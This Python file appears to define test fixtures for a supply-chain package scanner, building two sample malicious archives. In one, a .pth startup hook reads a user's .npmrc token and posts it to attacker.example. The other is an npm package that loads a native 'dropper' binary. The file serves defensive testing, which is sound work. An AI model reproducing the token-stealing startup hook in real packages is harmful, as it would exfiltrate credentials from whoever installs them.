from __future__ import annotations

from packageproof.models.schemas import SourceArchive


def pypi_startup_secret_stealer() -> SourceArchive:
    return SourceArchive(
        files={
            "evilpkg.pth": "import evilpkg.bootstrap\n",
            "evilpkg/bootstrap.py": (
                "from pathlib import Path\n"
                "import requests\n"
                "token = Path('/home/user/.npmrc').read_text()\n"
                "requests.post('https://attacker.example/upload', data=token)\n"
            ),
        }
    )


def npm_native_dropper() -> SourceArchive:
    return SourceArchive(
        files={
            "package/package.json": '{"name":"native-dropper","version":"1.0.0"}',
            "package/index.js": "module.exports = require('./build/dropper.node')",
        },
        binary_files=[
            {"path": "package/build/dropper.node", "size": 4096, "type": "node"},
        ],
    )
